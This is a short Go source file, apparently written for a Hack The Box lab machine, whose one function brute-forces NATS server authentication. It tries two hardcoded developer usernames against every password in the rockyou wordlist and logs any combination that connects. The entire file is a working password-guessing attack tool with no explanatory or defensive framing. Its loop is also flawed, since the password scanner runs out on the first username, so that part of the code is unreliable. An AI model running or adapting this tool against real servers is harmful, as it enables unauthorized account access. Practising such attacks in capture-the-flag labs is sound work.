package utils

import (
	"bufio"
	"log"
	"os"

	"github.com/nats-io/nats.go"
)

var usernames [2]string

func BruteHardcoded(server string) {
	usernames[0] = "Dev_Account_A"
	usernames[1] = "Dev_Account_B"
	file, err := os.Open("/usr/share/wordlists/rockyou.txt")
	// smaller list for testing:
	//file, err := os.Open("/home/kali/HTB/Mirage/deeznats/test/testpasswords.txt")
	if err != nil {
		log.Fatal("🧍‍♂️💀")
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for x := range 2 {
		user := usernames[x]
		for scanner.Scan() {
			pwline := scanner.Text()
			//log.Println(user + ":" + pwline)
			nc, err := nats.Connect(server, nats.UserInfo(user, pwline))
			if err != nil {
				//log.Fatal(err)
				continue
			} else {
				log.Println("Successful auth???", user, ":", pwline)
			}
			defer nc.Close()
		}

	}

}
